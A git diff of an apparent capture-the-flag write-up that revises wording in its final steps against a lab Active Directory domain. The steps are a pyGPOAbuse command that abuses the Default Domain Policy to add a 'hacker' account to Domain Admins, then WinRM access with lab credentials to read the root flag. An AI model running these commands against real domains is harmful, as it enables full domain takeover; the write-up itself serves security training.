@@ -145,26 +145,26 @@ nxc smb 10.1.25.72 -u greg.shields -p '5y5coSmarter2025!!!'
   <img src="./assets/Screenshots/16.png" />
 </p>
 
-- On bloodhound, we uncovered that `greg.shields` can be used to abuse the Default Domain Policy GPO, leading to domain compromise:
+- On bloodhound, we uncovered that `greg.shields` could be used to abuse the Default Domain Policy GPO, leading to domain compromise:
 <p align="center">
   <img src="./assets/Screenshots/17.png" />
 </p>
 
-- For that, we attempted to create a new user and add him to the local admin group:
+- For that, we created a new user and added him to the Domain Admins group:
 ```bash
 python3 pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -taskname SecurityUpdate  -dc-ip 10.1.25.72 -command 'net user hacker Password123! /add && net group "Domain Admins" hacker /add' -filter-enabled -target-dns-name dc01.sysco.local
 ```
 
-- After a ~5 minutes, we notice that our fake user is part of the Domain Admins group: 
+- After a ~5 minutes, we noticed that our fake user was part of the Domain Admins group: 
 ```powershell
 Get-ADGroupMember -Identity "Domain Admins"
 ```
-	- Note, we could have force the app
+	- Note: We could have forced the application of the GPO immediately using gpupdate /force
 <p align="center">
   <img src="./assets/Screenshots/18.png" />
 </p>
 
-- Finally, we can proceed to collect the last flag by accessing the target over WinRM: 
+- Finally, we proceeded to collect the last flag by accessing the target over WinRM: 
 ```bash
 evil-winrm -i 10.1.25.72 -u hacker -p 'Password123!'
 cat C:\Users\Administrator\Desktop\root.txt
